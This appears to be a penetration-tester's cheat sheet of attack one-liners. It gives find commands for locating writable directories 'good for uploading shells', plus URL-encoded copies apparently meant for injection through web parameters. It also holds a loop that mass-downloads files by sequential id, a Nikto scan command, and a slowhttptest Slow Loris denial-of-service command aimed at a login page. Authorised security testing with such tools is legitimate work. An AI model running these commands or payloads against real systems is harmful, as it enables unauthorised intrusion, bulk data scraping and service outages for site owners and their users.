Mirror website with wget
------------------------
```
wget -mkEpnp http://www.yoursite.org
```
Find Writeable Directories (Good for uploading shells)
------------------------
```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
# URL Encoded
%66%69%6e%64%20%2f%20%2d%74%79%70%65%20%64%20%5c%28%20%2d%70%65%72%6d%20%2d%67%2b%77%20%2d%6f%72%20%2d%70%65%72%6d%20%2d%6f%2b%77%20%5c%29%20%2d%65%78%65%63%20%6c%73%20%2d%61%64%6c%20%7b%7d%20%5c%3b%0a
```
```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; | grep www-data
# URL Encoded
%66%69%6e%64%20%2f%20%2d%74%79%70%65%20%64%20%5c%28%20%2d%70%65%72%6d%20%2d%67%2b%77%20%2d%6f%72%20%2d%70%65%72%6d%20%2d%6f%2b%77%20%5c%29%20%2d%65%78%65%63%20%6c%73%20%2d%61%64%6c%20%7b%7d%20%5c%3b%20%7c%20%67%72%65%70%20%77%77%77%2d%64%61%74%61%0a
```

Mass download files by id
------------------------
```bash
#!/bin/bash
   for i in `seq 1000 5000`;
      do
         wget http://your.site.com:80/pathtodownloads/file.php?id=$i
      done
```
Nikto scan all and output to html
------------------------
```
nikto -Display V -o results.html -Format htm -h http://xxx.xxx.xxx.xx:80/directory/
```
Slow Loris (slowhttptest)
------------------------
```
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://xxx.xxx.xxx.xxx/login/login.html -x 24 -p 3
```
